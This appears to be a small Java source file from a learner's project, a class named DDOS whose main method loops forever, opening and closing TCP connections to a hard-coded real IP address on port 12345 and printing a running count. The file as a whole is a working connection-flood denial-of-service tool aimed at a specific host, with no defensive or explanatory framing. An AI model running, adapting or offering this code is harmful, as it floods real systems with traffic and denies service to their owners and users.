package Others;

import JunitLearn.code.Calculator;

import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class DDOS {
    private static final int NUM = 100;
    private static int i = 0;

    public static void main(String[] args) {
        while(true){
            try {
                new Socket("115.156.163.253", 12345).close();
                if(++i%NUM==0)
                    System.out.println(i);
            }catch (Exception e){
                e.printStackTrace();
            }
        }
    }
}
